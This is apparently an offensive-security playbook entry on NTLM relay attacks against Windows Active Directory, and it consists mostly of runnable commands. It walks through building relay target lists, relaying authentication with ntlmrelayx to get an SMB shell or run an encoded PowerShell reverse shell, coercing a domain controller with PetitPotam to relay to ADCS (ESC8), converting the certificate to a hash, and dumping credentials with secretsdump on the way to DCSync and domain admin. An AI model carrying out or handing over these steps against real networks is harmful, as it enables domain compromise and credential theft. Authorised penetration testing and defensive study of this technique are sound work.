---
id: ntlm-relay
title: NTLM Relay
stage: initial-access
tags: [windows, ad, smb]
summary: Intercept and relay NTLM authentication to a target you control — SMB signing disabled is the prerequisite, and relaying to ADCS can yield a domain admin certificate.
leads_to:
  - rev-shell
  - pass-the-hash
  - domain-admin
  - dcsync
  - adcs-esc1
  - print-spooler-coercion
---

## Prerequisites

SMB signing disabled on at least one target (verify with `nxc smb $CIDR --gen-relay-list`). Must be on the same network segment to capture authentications, or use coercion to force auth from a specific machine.

NTLM relay intercepts an authentication challenge from one machine and forwards it to another, tricking the second machine into thinking the first has authenticated. The most powerful use is relaying to ADCS Web Enrollment (ESC8) — you relay a DC's authentication and get a certificate that lets you impersonate the DC, leading directly to domain admin via DCSync.

## Quick Win

> Generate the relay target list — if this is empty, relay isn't viable, switch to capture.

```bash
nxc smb 192.168.x.0/24 --gen-relay-list targets.txt
```

## Relay to SMB (Shell or Dump)

> Relayed user's credential is used against the target — if they're local admin, you get a shell.

```bash
# Interactive SMB shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i
nc 127.0.0.1 11000   # connect to the spawned shell

# Direct command execution
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <base64_reverse_shell>"
```

## Relay to ADCS (ESC8) — DC Certificate

> Relay a DC's machine account auth to ADCS → get a DC certificate → DCSync without DA.

```bash
# Step 1: Set up relay to ADCS Web Enrollment
impacket-ntlmrelayx -t http://$CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2: Coerce DC authentication to your listener
python3 PetitPotam.py $ATTACKER_IP $DC_IP

# Step 3: Convert certificate to NT hash
certipy auth -pfx dc.pfx -dc-ip $DC_IP
```

## After Relay Success

> Relayed user is local admin → dump immediately before the session expires.

```bash
impacket-secretsdump $DOMAIN/user@$TARGET -hashes :NTLM_HASH
```

## Leads To

Local admin relay on a workstation → dump SAM hashes → pass-the-hash across the subnet. ADCS ESC8 relay → DC certificate → certipy auth → NT hash of DC machine account → DCSync → domain-admin. Relay to multiple targets simultaneously with ntlmrelayx's default multi-target mode.
